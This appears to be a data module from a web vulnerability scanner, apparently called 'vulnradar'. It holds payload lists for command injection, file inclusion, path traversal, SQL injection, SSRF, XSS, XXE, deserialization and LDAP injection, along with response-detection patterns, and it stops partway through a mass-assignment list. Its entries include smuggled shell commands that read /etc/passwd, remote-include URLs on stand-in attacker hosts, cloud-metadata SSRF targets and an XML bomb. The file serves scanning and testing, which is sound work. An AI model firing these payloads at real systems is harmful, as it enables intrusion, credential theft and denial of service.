# == COMMAND INJECTION PAYLOADS
comm_injection_payloads = [
    # Basic command separators
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    "|| whoami",
    "`whoami`",
    "$(whoami)",
    # Time-based payloads
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    # Directory listing
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "`ls`",
    "$(ls)",
    # Windows equivalents
    "; dir",
    "| dir",
    "& dir",
    "&& dir",
    "|| dir",
    "`dir`",
    "$(dir)",
    # Path traversal combined with command injection
    "../../../bin/ls",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    # URL encoded payloads
    "%3B%20whoami",
    "%7C%20whoami",
    "%26%20whoami",
    "%26%26%20whoami",
    "%7C%7C%20whoami",
    # Double URL encoded
    "%253B%2520whoami",
    "%257C%2520whoami",
    "%2526%2520whoami",
    # Newline injection
    "\n whoami",
    "\r whoami",
    "\r\n whoami",
    "%0A whoami",
    "%0D whoami",
    "%0D%0A whoami",
    # Null byte injection
    "\x00; whoami",
    "%00; whoami",
    # Alternative command execution
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    # Windows file access
    "; type C:\\windows\\system.ini",
    "| type C:\\windows\\system.ini",
    "&& type C:\\windows\\system.ini",
    "|| type C:\\windows\\system.ini",
    # Command chaining with various separators
    "test; whoami; echo done",
    "test | whoami | echo done",
    "test & whoami & echo done",
    "test && whoami && echo done",
    "test || whoami || echo done",
    # Backtick command substitution
    "test`whoami`test",
    "test$(whoami)test",
    # PowerShell injection (Windows)
    "; powershell -c whoami",
    "| powershell -c whoami",
    "&& powershell -c whoami",
    "|| powershell -c whoami",
]

comm_injection_evidence_patterns = [
    # Unix/Linux user information
    r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)",  # whoami output
    r"root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd|messagebus|sshd|mysql|nginx|apache",  # noqa
    # Directory listings
    r"drwxr-xr-x|drwx------|-rw-r--r--|-rwxr-xr-x",  # ls -la output
    r"total \d+",  # ls total line
    r"bin|etc|usr|var|tmp|home|root|dev|proc|sys",  # Common Unix directories
    # Windows specific
    r"C:\\Windows|C:\\Program Files|C:\\Users",
    r"Volume in drive [A-Z] is",  # dir command output
    r"Directory of [A-Z]:",  # dir command output
    r"<DIR>",  # Windows directory listing
    r"SYSTEM|Administrator|Guest|Everyone",  # Windows users/groups
    # File contents
    r"root:x:0:0:root:/root:/bin/bash",  # /etc/passwd
    r"\[boot loader\]|\[operating systems\]",  # Windows boot.ini
    r"for 16-bit app support",  # Windows system.ini
    # Error messages that might indicate command execution
    r"command not found|No such file or directory",
    r"'[^']*' is not recognized as an internal or external command",
    r"The system cannot find the file specified",
    # Time-based indicators (sleep command)
    r"sleep: invalid time interval",
    r"sleep: missing operand",
    # PowerShell output
    r"PS [A-Z]:\\>",
    r"Windows PowerShell",
]

comm_injection_vulnerable_params = [
    "cmd",
    "command",
    "exec",
    "execute",
    "system",
    "shell",
    "bash",
    "sh",
    "ping",
    "host",
    "nslookup",
    "dig",
    "traceroute",
    "whois",
    "file",
    "filename",
    "path",
    "dir",
    "directory",
    "folder",
    "url",
    "uri",
    "link",
    "download",
    "upload",
    "import",
    "export",
    "backup",
    "restore",
    "compress",
    "decompress",
    "zip",
    "unzip",
    "log",
    "logs",
    "debug",
    "trace",
    "monitor",
    "test",
    "check",
    "config",
    "settings",
    "options",
    "params",
    "args",
    "arguments",
    "input",
    "data",
    "value",
    "content",
    "text",
    "message",
]

# == FILE INCLUSION PAYLOADS
file_inclusion_lfi_payloads = [
    # Basic LFI
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # Null byte injection (older systems)
    "../../../etc/passwd%00",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
    # URL encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
    # Double URL encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%255C..%255C..%255Cwindows%255Csystem32%255Cdrivers%255Cetc%255Chosts",
    # PHP wrappers
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    # Common config files
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../etc/hostname",
    "../../../proc/version",
    "../../../proc/self/environ",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\system32\\config\\system",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system.ini",
    # Application-specific files
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache2/error.log",
    "../../../var/log/nginx/access.log",
    "../../../var/log/nginx/error.log",
    "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log",
    # Common web application files
    "../../../config/database.yml",
    "../../../config/config.php",
    "../../../wp-config.php",
    "../../../application/config/database.php",
    "..\\..\\..\\web.config",
    "..\\..\\..\\app\\config\\parameters.yml",
]

file_inclusion_rfi_payloads = [
    "http://evil.com/shell.txt",
    "https://pastebin.com/raw/test",
    "ftp://attacker.com/shell.php",
    "http://169.254.169.254/",  # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
]

file_inclusion_lfi_patterns = [
    r"root:.*:0:0:",
    r"# Host Database",
    r"# localhost",
    r"\[boot loader\]",
    r"# For more information about this file",
    r"DNS=",
    r"Microsoft Windows",
    r"Linux version",
    r"uid=\d+",
    r"gid=\d+",
    r"groups=\d+",
    r"www-data",
    r"nobody",
    r"daemon",
    r"<\?php",
    r"<\?xml",
    r"define\(",
    r"mysql_connect",
    r"mysqli_connect",
    r"PDO\(",
    r"password.*=.*['\"]",
    r"secret.*=.*['\"]",
    r"api_key.*=.*['\"]",
]
file_inclusion_file_params = [
    "file",
    "include",
    "page",
    "template",
    "view",
    "doc",
    "document",
    "path",
    "show",
    "dir",
    "folder",
    "inc",
    "locate",
    "cat",
    "detail",
    "content",
    "read",
    "get",
    "lang",
    "language",
    "home",
    "action",
    "board",
    "date",
    "goto",
    "link",
    "load",
    "open",
    "root",
    "style",
    "class",
    "return",
    "data",
    "src",
    "resource",
    "load_file",
    "path_info",
]

# == PATH TRAVERSAL PAYLOADS
path_traversal_payloads = [
    # Basic path traversal
    "../../../",
    "..\\..\\..\\",
    "../../../../",
    "..\\..\\..\\..\\",
    # Encoded payloads
    "%2e%2e%2f",
    "%2e%2e%5c",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
    # Double encoded
    "%252e%252e%252f",
    "%252e%252e%255c",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
    # Unicode encoded
    "%c0%ae%c0%ae%c0%af",
    "%c1%9c%c1%9c%c1%af",
    # Mixed encoding
    "..%252f",
    "..%255c",
    "%2e%2e/",
    "%2e%2e\\",
    # 16-bit Unicode
    "%u002e%u002e%u002f",
    "%u002e%u002e%u005c",
    # Overlong UTF-8
    "%c0%2e%c0%2e%c0%2f",
    "%e0%80%ae%e0%80%ae%e0%80%af",
    # Null byte (older systems)
    "../../../%00",
    "..\\..\\..\\%00",
    # Various combinations
    "....//",
    "....\\\\",
    "..../",
    "....\\",
    "....//....//....//",
    # Filter bypass attempts
    "...../",
    ".....\\",
    "....../",
    "......\\",
    "..;/",
    "..;\\",
    "..\\/",
    "../\\",
    "..\\./",
    "..\\../",
    # OS-specific variations
    "..\\..\\windows\\system32\\",
    "../../../etc/",
    "..\\..\\..\\windows\\",
    "../../../../var/",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\",
    "../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # Specific file access attempts
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../etc/shadow",
    "../../../etc/group",
    "../../../etc/hostname",
    "../../../etc/issue",
    "../../../etc/motd",
    "../../../etc/apache2/apache2.conf",
    "../../../etc/nginx/nginx.conf",
    "../../../proc/version",
    "../../../proc/meminfo",
    "../../../proc/cpuinfo",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\system32\\config\\system",
    "..\\..\\..\\windows\\system32\\config\\security",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\inetpub\\wwwroot\\web.config",
    "..\\..\\..\\boot.ini",
    # Web application files
    "../../../config/database.yml",
    "../../../config/database.php",
    "../../../wp-config.php",
    "../../../.env",
    "../../../.htaccess",
    "../../../composer.json",
    "../../../package.json",
    "../../../Gemfile",
    "../../../settings.py",
    "../../../config.php",
    "../../../app/config/parameters.yml",
    "../../../application/config/database.php",
    "..\\..\\..\\web.config",
    "..\\..\\..\\global.asax",
    "..\\..\\..\\app_data\\",
    # Log files
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache2/error.log",
    "../../../var/log/nginx/access.log",
    "../../../var/log/nginx/error.log",
    "../../../var/log/auth.log",
    "../../../var/log/syslog",
    "../../../var/log/messages",
    "..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\",
    "..\\..\\..\\windows\\system32\\logfiles\\httperr\\",
    # Interesting directories
    "../../../home/",
    "../../../tmp/",
    "../../../var/tmp/",
    "../../../var/www/",
    "../../../usr/local/",
    "../../../opt/",
    "..\\..\\..\\users\\",
    "..\\..\\..\\temp\\",
    "..\\..\\..\\windows\\temp\\",
    "..\\..\\..\\inetpub\\wwwroot\\",
    "..\\..\\..\\program files\\",
    "..\\..\\..\\program files (x86)\\",
]

path_traversal_detection_patterns = [
    # /etc/passwd patterns
    r"root:.*:0:0:",
    r"daemon:.*:",
    r"bin:.*:",
    r"sys:.*:",
    r"sync:.*:",
    r"games:.*:",
    r"man:.*:",
    r"lp:.*:",
    r"mail:.*:",
    r"news:.*:",
    r"uucp:.*:",
    r"proxy:.*:",
    r"www-data:.*:",
    r"backup:.*:",
    r"list:.*:",
    r"irc:.*:",
    r"gnats:.*:",
    r"nobody:.*:",
    r"systemd-.*:",
    r"syslog:.*:",
    r"_apt:.*:",
    r"messagebus:.*:",
    r"uuidd:.*:",
    r"dnsmasq:.*:",
    # Windows hosts file
    r"# Copyright \(c\) 1993-\d+ Microsoft Corp\.",
    r"# This is a sample HOSTS file used by Microsoft TCP/IP",
    r"# For example:",
    r"# localhost name resolution is handled within DNS itself",
    r"127\.0\.0\.1\s+localhost",
    r"::1\s+localhost",
    # Windows system files
    r"\[boot loader\]",
    r"\[operating systems\]",
    r"multi\(\d+\)disk\(\d+\)rdisk\(\d+\)partition\(\d+\)",
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mci extensions\]",
    r"\[files\]",
    r"\[Mail\]",
    r"MAPI=1",
    r"CMC=1",
    r"MAPIX=1",
    # System information
    r"Linux version \d+\.\d+\.\d+",
    r"gcc version \d+\.\d+\.\d+",
    r"Microsoft Windows \[Version \d+\.\d+\.\d+\]",
    r"Windows NT \d+\.\d+",
    r"PROCESSOR_IDENTIFIER=",
    r"PROCESSOR_ARCHITECTURE=",
    r"NUMBER_OF_PROCESSORS=",
    r"COMPUTERNAME=",
    r"USERNAME=",
    r"USERPROFILE=",
    r"PROGRAMFILES=",
    # Process information
    r"MemTotal:\s+\d+\s+kB",
    r"MemFree:\s+\d+\s+kB",
    r"Buffers:\s+\d+\s+kB",
    r"Cached:\s+\d+\s+kB",
    r"SwapCached:\s+\d+\s+kB",
    r"Active:\s+\d+\s+kB",
    r"Inactive:\s+\d+\s+kB",
    r"processor\s+:\s+\d+",
    r"vendor_id\s+:\s+\w+",
    r"cpu family\s+:\s+\d+",
    r"model\s+:\s+\d+",
    r"model name\s+:\s+.*",
    r"stepping\s+:\s+\d+",
    r"microcode\s+:\s+0x[0-9a-fA-F]+",
    r"cpu MHz\s+:\s+\d+\.\d+",
    r"cache size\s+:\s+\d+\s+KB",
    r"physical id\s+:\s+\d+",
    r"siblings\s+:\s+\d+",
    r"core id\s+:\s+\d+",
    r"cpu cores\s+:\s+\d+",
    r"apicid\s+:\s+\d+",
    r"initial apicid\s+:\s+\d+",
    r"fpu\s+:\s+yes",
    r"fpu_exception\s+:\s+yes",
    r"cpuid level\s+:\s+\d+",
    r"wp\s+:\s+yes",
    r"bogomips\s+:\s+\d+\.\d+",
    r"clflush size\s+:\s+\d+",
    r"cache_alignment\s+:\s+\d+",
    r"address sizes\s+:\s+\d+ bits physical, \d+ bits virtual",
    r"power management:",
    # Configuration files
    r"define\s*\(\s*['\"]DB_HOST['\"]",
    r"define\s*\(\s*['\"]DB_NAME['\"]",
    r"define\s*\(\s*['\"]DB_USER['\"]",
    r"define\s*\(\s*['\"]DB_PASSWORD['\"]",
    r"\$db_host\s*=",
    r"\$db_name\s*=",
    r"\$db_user\s*=",
    r"\$db_password\s*=",
    r"mysql_connect\s*\(",
    r"mysqli_connect\s*\(",
    r"new PDO\s*\(",
    r"password\s*[:=]\s*['\"][^'\"]*['\"]",
    r"secret\s*[:=]\s*['\"][^'\"]*['\"]",
    r"api_key\s*[:=]\s*['\"][^'\"]*['\"]",
    r"access_token\s*[:=]\s*['\"][^'\"]*['\"]",
    r"private_key\s*[:=]\s*['\"][^'\"]*['\"]",
    # Web server configs
    r"DocumentRoot\s+",
    r"ServerName\s+",
    r"ServerRoot\s+",
    r"Listen\s+\d+",
    r"LoadModule\s+",
    r"<VirtualHost\s*.*>",
    r"</VirtualHost>",
    r"<Directory\s*.*>",
    r"</Directory>",
    r"AllowOverride\s+",
    r"DirectoryIndex\s+",
    r"ErrorLog\s+",
    r"CustomLog\s+",
    r"LogFormat\s+",
    r"server\s*\{",
    r"location\s*.*\s*\{",
    r"root\s+/",
    r"index\s+",
    r"error_log\s+",
    r"access_log\s+",
    r"listen\s+\d+",
    r"server_name\s+",
    # Log file patterns
    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+-\s+-\s+\[",
    r"GET\s+/.*\s+HTTP/\d\.\d",
    r"POST\s+/.*\s+HTTP/\d\.\d",
    r"User-Agent:\s*Mozilla",
    r"Referer:\s*https?://",
    r"\[\w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}\]",
    r"INFO\s+",
    r"ERROR\s+",
    r"WARN\s+",
    r"DEBUG\s+",
    r"FATAL\s+",
    # Environment variables
    r"PATH=/",
    r"HOME=/",
    r"USER=",
    r"SHELL=/",
    r"TERM=",
    r"LANG=",
    r"LC_ALL=",
    r"PWD=/",
    r"OLDPWD=/",
    r"MAIL=/",
    r"LOGNAME=",
    r"SSH_CLIENT=",
    r"SSH_CONNECTION=",
    r"SSH_TTY=",
    # Common file extensions and content
    r"<\?php",
    r"<\?xml",
    r"<!DOCTYPE html",
    r"<html",
    r"<configuration>",
    r"<appSettings>",
    r"<connectionStrings>",
    r"<system\.web>",
    r"<compilation\s+debug=",
    r"<authentication\s+mode=",
    r"<authorization>",
    r"<machineKey",
    r"require_once\s*\(",
    r"include_once\s*\(",
    r"import\s+",
    r"from\s+.*\s+import",
    r"namespace\s+",
    r"using\s+System",
    r"<%@\s+Page",
    r"<%@\s+Control",
    r"<%@\s+Master",
]

path_traversal_vulnerable_params = [
    # Explicit file/path semantics
    "file",
    "filename",
    "filepath",
    "pathname",
    "path",
    "page",
    "include",
    "dir",
    "folder",
    "directory",
    "document",
    "doc",
    "template",
    "view",
    "show",
    "display",
    "read",
    "get",
    "load",
    "open",
    "cat",
    "type",
    "src",
    "source",
    "resource",
    # Common web framework conventions
    "url",
    "redirect",
    "forward",
    "next",
    "goto",
    "location",
    "return",
    "returnurl",
    "return_url",
    # Configuration/content
    "config",
    "conf",
    "content",
    "layout",
    "skin",
    "theme",
    "lang",
    "language",
    "locale",
    # Module/component loading patterns
    "module",
    "action",
    "controller",
]

# == SQL INJECTION PAYLOADS
sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR 1=1 --",
    "1' OR 1=1 #",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT 1,2,3,4 --",
    "' AND 1=0 UNION SELECT 1,2,3 --",
    "' AND 1=0 UNION SELECT 1,2,3,4 --",
    "1' AND SLEEP(5) --",
    "1' AND SLEEP(5) #",
    "' WAITFOR DELAY '0:0:5' --",
]

sqli_error_patterns = [
    "sql syntax",
    "syntax error",
    "mysql_fetch_array",
    "mysql_fetch_assoc",
    "mysql_num_rows",
    "mysql_query",
    "pg_query",
    "sqlite_query",
    "ORA-01756",
    "ORA-00933",
    "SQL Server",
    "unclosed quotation mark",
    "unterminated string",
    "undetermined error",
    "on line [0-9]+ of .+\\.php",
    "database error",
]

# == SSRF PAYLOADS
ssrf_payloads = [
    # Internal IP addresses
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3000",
    "http://localhost:80",
    "http://localhost:22",
    "http://localhost:443",
    "http://0.0.0.0:80",
    "http://0:80",
    # Internal network ranges
    "http://192.168.1.1",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    # Cloud metadata services
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://100.100.100.200/latest/meta-data/",
    # Alternative representations
    "http://2130706433/",
    "http://0x7f000001/",
    "http://017700000001/",
    "http://127.1/",
    # File protocol
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/version",
    "file:///windows/win.ini",
    "file://localhost/etc/passwd",
    # Other protocols
    "ftp://127.0.0.1/",
    "gopher://127.0.0.1:70/",
    "dict://127.0.0.1:2628/",
    "ldap://127.0.0.1/",
    # URL encoding bypasses
    "http://127.0.0.1%2F",
    "http://127.0.0.1%3A80",
    "http://127%2E0%2E0%2E1",
    # Unicode bypasses
    "http://127。0。0。1",
    "http://127.0.0.1。",
    # Domain variations
    "http://localhost.localdomain",
    "http://0.0.0.0.nip.io",
    "http://127.0.0.1.nip.io",
    # Other internal services
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:11211",
    "http://127.0.0.1:9200",
]

ssrf_indicators = [
    # File system indicators
    "root:x:0:0:",
    "bin:x:1:1:",
    "daemon:x:2:2:",
    "# Copyright (c) 1993-2009 Microsoft Corp.",
    "; for 16-bit app support",
    "[fonts]",
    # Network service indicators
    "SSH-2.0-",
    "220 ",
    "HTTP/1.1 ",
    "HTTP/1.0 ",
    "Server: ",
    "Content-Type: ",
    # Cloud metadata indicators
    "ami-",
    "instance-id",
    "instance-type",
    "local-hostname",
    "public-hostname",
    "security-groups",
    "availability-zone",
    "placement",
    "network",
    "instance-identity",
    # Database indicators
    "mysql",
    "postgresql",
    "redis",
    "mongodb",
    "memcached",
    "elasticsearch",
    # Error messages that indicate successful internal access
    "Connection refused",
    "Connection timeout",
    "Internal Server Error",
    "504 Gateway Timeout",
    "502 Bad Gateway",
    "Network is unreachable",
    "No route to host",
]

ssrf_vulnerable_params = [
    "url",
    "uri",
    "path",
    "continue",
    "window",
    "next",
    "data",
    "reference",
    "site",
    "html",
    "val",
    "validate",
    "domain",
    "callback",
    "return",
    "page",
    "feed",
    "host",
    "port",
    "to",
    "out",
    "view",
    "dir",
    "show",
    "navigation",
    "open",
    "file",
    "document",
    "folder",
    "ping",
    "lookup",
    "proxy",
    "redirect",
    "target",
    "link",
    "goto",
    "endpoint",
    "api",
    "webhook",
    "fetch",
    "load",
    "download",
    "upload",
    "import",
    "export",
    "backup",
    "restore",
    "sync",
    "connect",
    "check",
]

# == XSS PAYLOADS
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "\"><img src=x onerror=alert('XSS')>",
    "<scr<script>ipt>alert('XSS')</script>",
    "'>\"><script>alert('XSS')</script>",
    "'\"</script><script>alert('XSS')</script>",
    "\";alert('XSS');//",
    "' onclick='alert(\"XSS\")' '",
    "javascript:alert('XSS')",
]

# == API SECURITY PATTERNS
api_non_production_patterns = [
    "/api/v0/",
    "/api/dev/",
    "/api/test/",
    "/api/staging/",
    "/api/internal/",
    "/api/debug/",
    "/api/old/",
    "/api/deprecated/",
    "/api/admin/",
    "/v0/",
    "/dev/",
    "/test/",
    "/staging/",
    "/internal/",
    "/debug/",
    "/old/",
    "/deprecated/",
    "/_debug/",
    "/_internal/",
    "/swagger/",
    "/swagger-ui/",
    "/api-docs/",
    "/graphql-playground/",
]

# == BROKEN AUTH PAYLOADS
broken_auth_username_hints = [
    "username",
    "user",
    "email",
    "login",
    "uid",
    "userid",
    "user_name",
    "user_email",
    "signin_email",
]

broken_auth_password_hints = [
    "password",
    "passwd",
    "pwd",
    "pass",
    "secret",
    "user_password",
    "signin_password",
]

# == XXE PAYLOADS
xxe_file_linux = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

xxe_file_windows = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
  <data>&xxe;</data>
</root>"""

xxe_oob_marker = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe_{marker} "vulnradar_xxe_probe_{marker}">
]>
<root>
  <data>&xxe_{marker};</data>
</root>"""

xxe_billion_laughs = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>"""

xxe_external_dtd = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://vulnradar-xxe-probe-{marker}.invalid/xxe.dtd">
<root>
  <data>test</data>
</root>"""

# == XXE EVIDENCE INDICATORS
xxe_linux_passwd_indicators = [
    "root:x:0:0",
    "root:*:0:0",
    "/bin/bash",
    "/sbin/nologin",
    "daemon:x:",
]

xxe_windows_ini_indicators = [
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
    "win.ini",
]

xxe_billion_laughs_indicators = [
    "entity expansion",
    "entity reference limit",
    "recursion limit",
    "memory limit",
    "parser error",
    "xml bomb",
    "denial of service",
    "out of memory",
    "stackoverflow",
]

xxe_external_dtd_indicators = [
    "vulnradar-xxe-probe",
    "could not resolve",
    "failed to load external entity",
    "dtd forbidden",
    "external entity",
    "connection refused",
    "unknown host",
]

# == DESERIALIZATION PAYLOADS
deserialization_java_magic = b"\xac\xed\x00\x05"

deserialization_java_tc_null = b"\xac\xed\x00\x05\x70"

deserialization_java_probe_class = (
    b"\xac\xed\x00\x05"  # magic
    b"\x73"  # TC_OBJECT
    b"\x72"  # TC_CLASSDESC
    b"\x00\x1d"  # class name length = 29
    b"vulnradar.DeserProbe$X"  # bogus class name (29 bytes)
    b"\x00\x00\x00\x00\x00\x00"  # padding
    b"\x00\x00"  # serialVersionUID (8 bytes, zeroed)
    b"\x00\x00\x00\x00\x00\x00"
    b"\x00\x00"
    b"\x02"  # flags: SC_SERIALIZABLE
    b"\x00\x00"  # field count = 0
    b"\x78"  # TC_ENDBLOCKDATA
    b"\x70"  # TC_NULL (no superclass)
)

deserialization_python_empty_dict = b"\x80\x02}q\x00."

deserialization_python_probe_module = (
    b"\x80\x02"  # PROTO 2
    b"c"  # GLOBAL opcode
    b"vulnradar_probe_module\nProbe\n"  # module\nname\n
    b")"  # EMPTY_TUPLE
    b"\x81"  # NEWOBJ
    b"."  # STOP
)

deserialization_python_session_cookie_names = (
    "session",
    "flask_session",
    "csrftoken",
    "sessionid",
)

# PHP deserialization variables
deserialization_php_probe_object = b'O:14:"VulnradarProbe":1:{s:4:"test";s:5:"probe";}'

deserialization_php_probe_array = b'a:1:{s:4:"test";s:5:"probe";}'

deserialization_php_session_cookie_names = ("PHPSESSID", "session", "sess_id")

deserialization_php_serial_prefixes = (
    b"s:",
    b"i:",
    b"d:",
    b"b:",
    b"N;",
    b"a:",
    b"O:",
    b"C:",
)

# Node.js/Express deserialization variables
deserialization_nodejs_benign_object = b'{"vulnradar_probe": "test", "value": 1}'

deserialization_nodejs_probe_property = (
    b'{"vulnradar_nodejs_probe": "check", "_vulnradar_test": true}'
)

deserialization_nodejs_session_cookie_names = (
    "connect.sid",
    "session",
    "sessionid",
    "sid",
    "express.sid",
)

# == LDAP INJECTION PAYLOADS
ldap_injection_payloads = [
    # Error-based: syntactically invalid LDAP filters
    (
        "*",
        "error_based",
        "Single asterisk — invalid as standalone filter, triggers syntax error",
    ),
    (")", "error_based", "Unmatched closing parenthesis — syntax error"),
    ("(", "error_based", "Unmatched opening parenthesis — syntax error"),
    (
        ")(uid=*)",
        "error_based",
        "Dangling closing paren before valid filter — syntax error",
    ),
    ("|", "error_based", "OR operator without operands — syntax error"),
    ("&", "error_based", "AND operator without operands — syntax error"),
    ("!", "error_based", "NOT operator without operand — syntax error"),
    ("\\", "error_based", "Escape character alone — syntax error"),
    # Auth-bypass: filter rewrites that match everything or force OR logic
    (
        "*)(uid=*",
        "auth_bypass",
        "Closes original filter, then adds OR uid=* — matches all users",
    ),
    (
        "admin)(|(uid=*",
        "auth_bypass",
        "Closes original UID check, adds OR uid=* — bypasses password check",
    ),
    (
        "*)(objectClass=*",
        "auth_bypass",
        "Closes filter, adds OR objectClass=* — matches all directory entries",
    ),
    (
        "admin)(&(uid=*",
        "auth_bypass",
        "Closes UID, adds AND uid=* — short-circuits password check",
    ),
    ("*)((|uid=*", "auth_bypass", "Closes filter with OR uid=* — auth bypass"),
    (
        "admin)(|(objectClass=*)",
        "auth_bypass",
        "OR objectClass=* — matches everything in the directory",
    ),
    # Wildcard enumeration: patterns for response-length oracles
    (
        "admin*",
        "wildcard",
        "Wildcard on common username — different response if admin exists",
    ),
    ("test*", "wildcard", "Wildcard on test account — length oracle"),
    ("user*", "wildcard", "Wildcard on generic username — length oracle"),
    ("a*", "wildcard", "Single-char wildcard — length oracle"),
    (
        "zzznomatch*",
        "wildcard",
        "Known-nonexistent prefix — baseline for length comparison",
    ),
]

ldap_injection_error_indicators = [
    # Generic LDAP error phrases
    "ldap error",
    "invalid dn syntax",
    "invalid ldap",
    "ldap search failed",
    "bad search filter",
    "malformed filter",
    # Java LDAP exceptions
    "javax.naming.namenotfoundexception",
    "javax.naming.invalidnameexception",
    "javax.naming.namingexception",
    "com.sun.jndi.ldap",
    # Python LDAP exceptions
    "ldap.invalid_dn_syntax",
    "ldap.filter_error",
    "ldap3.core.exceptions",
    # PHP LDAP errors
    "ldap_search()",
    "ldap_bind()",
    "warning: ldap",
    # OpenLDAP / Active Directory error codes
    "error code 34",  # invalid DN syntax
    "error code 87",  # bad search filter
    "error code 12",  # unavailable critical extension (can indicate filter issues)
]

# == MASS ASSIGNMENT PAYLOADS
mass_assignment_probe_fields = [
    # Privilege flags
    (
        "is_admin",
        True,
        "High",
        "Direct admin-flag injection — full privilege escalation",
    ),
    ("admin", True, "High", "Boolean admin flag (alternate naming convention)"),
    ("is_staff", True, "High", "Staff-level privilege flag (Django convention)"),
    ("is_superuser", True, "High", "Superuser flag — highest privilege tier"),
    (
        "role",
        "admin",
        "High",
